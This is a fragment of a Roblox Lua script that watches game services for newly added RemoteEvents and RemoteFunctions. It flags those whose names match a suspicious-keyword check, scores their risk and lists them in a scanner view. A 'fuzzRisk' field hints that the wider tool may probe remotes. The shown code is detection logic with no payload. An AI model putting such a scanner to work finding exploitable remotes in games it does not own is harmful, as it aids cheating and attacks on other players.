-- ════════════════════════════════════════════════════════════════════════

local function startMonitor()
    for _,c in ipairs(S.monConns) do pcall(function() c:Disconnect() end) end
    S.monConns={}
    if not CFG.LIVE_MONITOR then return end
    log("SYS","Live monitor started — "..#CFG.SERVICES.." services")
    for _, svcName in ipairs(CFG.SERVICES) do
        local ok, svc = pcall(function() return game:GetService(svcName) end)
        if ok and svc then
            local c=svc.DescendantAdded:Connect(function(inst)
                if not CFG.LIVE_MONITOR then return end
                if inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction") then
                    local bad,kw=badName(inst.Name)
                    if bad then
                        log("CRIT","[MONITOR] NEW suspicious "..inst.ClassName.." '"..inst.Name.."' (kw:'"..tostring(kw).."') @ "..inst:GetFullName())
                        local entry={inst=inst,svc=svcName,path=inst:GetFullName(),class=inst.ClassName,keyword=kw,fuzzRisk=0}
                        entry.risk=calcRemoteRisk(entry)
                        S.remotes[#S.remotes+1]=entry; addRemoteRow(entry); updateStats(); switchTab("Scanner")
                    end
                end
            end)
            S.monConns[#S.monConns+1]=c
        end
    end
end

